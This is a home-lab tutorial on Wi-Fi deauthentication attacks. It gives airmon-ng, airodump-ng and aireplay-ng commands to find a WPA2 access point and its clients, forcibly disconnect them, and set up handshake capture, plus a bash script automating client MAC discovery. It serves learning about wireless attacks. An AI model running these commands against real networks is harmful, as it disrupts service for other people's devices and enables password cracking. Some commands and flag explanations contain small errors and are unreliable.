## Overview

In this tutorial, youâ€™ll learn how to:
- Enable monitor mode on a wireless adapter
- Use `airodump-ng` to find nearby Access Points and connected devices
- Target a specific AP and identify connected clients (stations)
- Use `aireplay-ng` to deauthenticate a client, useful for WPA handshake capture

## Prerequisites

- A computer running **Kali Linux**
- A **wireless adapter that supports monitor mode and packet injection**
  - In this lab I leverage the **HAK5 MK7AC WiFi Adapter**
- An access point that can use the WPA2-Personal protocol **AND** is using the 2.4GHz transmission frequency
  - In this lab I leverage the **NETGEAR R6400-100NAS** *Circa 2017*
*Note this lab hinges on these two commponents. I would recommend using an older router*
- Tools that already should be included in Kali:
  - `airmon-ng`
  - `airodump-ng`
  - `aireplay-ng`
- Superuser (`sudo`) privileges

## Step 1: Enable Monitor Mode

First, identify your wireless interface. As you can see below my inteface is called wlan0. Depending on how many wireless interfaces you have the one you want to choose may vary. 
*Note: I'm using root so I don't need to add sudo to my commands*

```bash
iwconfig
```

Next, using airmon-ng, part of the Aircrack-ng suite, is used for enabling and utilizing monitor mode. Essentially this mode lets the user monitor Wi-Fi traffic and capture packets. Now that it's in monitor mode the way to access this interface is via the **wlan0mon**. 

```bash
airmon-ng start wlan0
```

## Step 2: Discover the Target Access Point

Now that we have a wireless adapter that is in monitor mode it's time to determint the BSSID and Channel of the access point we are going to attack. Using the **wland0mon** interface we can begin to seach for these access points. Please be aware this only works on the 2.4GHz signal

```bash
sudo airodump-ng wlan0mon
```

After some time elaspse my router was able to be located aptly called **Lab_AP**. Noting the BSSID **A0:04:60:3A:1F:E5** and the channel, thrid column to the right **9** I have what I need to begin an attack.


## Step 2.5: Attempting an attack

Once you find the BSSID and Channel you can attempt a deauthentication attack against the access point's connected devices. However, it will try to spoof the MAC address of a device that's already connected. Unless you have the devices address it will be very difficult and require quite a bit of brute force to disconnect devices

First, make sure to set your wireless device in monitoring mode to the right channel otherwise it won't find the access point.

```bash
iwconfig wlan0mon channel <CH>
```

Leveraging the known BSSID you can attempt an attack.

```bash
aireplay-ng -0 100 -a <BSSID> wlan0mon
```
- -0 is the deauth attack type
- -100 is the  number of packets to send
- -a is the BSSID of the AP

![Image](images/6.png)

*I tested this with an old device hooked up to the access point and attempted this blind attack twice resulted in failed dauthentcation of the device*

## Step 3: Isolate Clients Connected to the AP

Once you find the BSSID and Channel you can attempt a deauthentication attack against the access point's connected devices. However, this time we'll acquire the client's MAC address first. 

```bash
airodump-ng --bssid <BSSID> --channel <CH> --write capture wlan0mon
```

![Image](images/7.png)

*Under the STATION column resides the MAC address of a device connected to the access point*

## Step 4: Preforming the Deauthentication Attack

After acquiring the MAC address you'll be able to begin the attack on the client device.

```bash
aireplay-ng -0 100 -a <BSSID> wlan0mon -c <CLIENT> wlan0mon
```

- -0 is the deauth attack type
- -100 is the  number of packets to send
- -a is the BSSID of the AP
- -c is the Client MAC address

## Step 5: Bash Script to Automate Discovery

You can automate the process of discovery by using a shell script like this. It simply takes two parameters at runtime the BSSID and the Channel. 
- There's a 10 second time limit for a time out.
- We make the call to airodump-ng to start the process of finding the clients on the device and writing it to an output.
- Then we grep out what we want from the csv file from the first column and then using regex to match a MAC address from the csv file.
- The sort just removes duplicates.


```bash
#!/bin/bash

# Simple Client MAC Discovery Tool

MON=wlan0mon
BSSID=$1
CHANNEL=$2
DURATION=10

if [[ -z "$BSSID" || -z "$CHANNEL" ]]; then
    echo "Usage: $0 <BSSID> <Channel>"
    exit 1
fi

echo "[****] Scanning for clients connected to BSSID: $BSSID on channel $CHANNEL"
timeout $DURATION airodump-ng --bssid $BSSID --channel $CHANNEL --write scan_output --output-format csv $MON > /dev/null 2>&1

echo "[****] Extracting connected clients"
grep "$BSSID" scan_output-01.csv | awk -F ',' '{print $1}' | grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | sort -u

echo "[****] Done."

```


## Final Thoughts
This lab is a good way to get started in understanding how Deauthentication attacks work, why they are powerful, and the tools required.
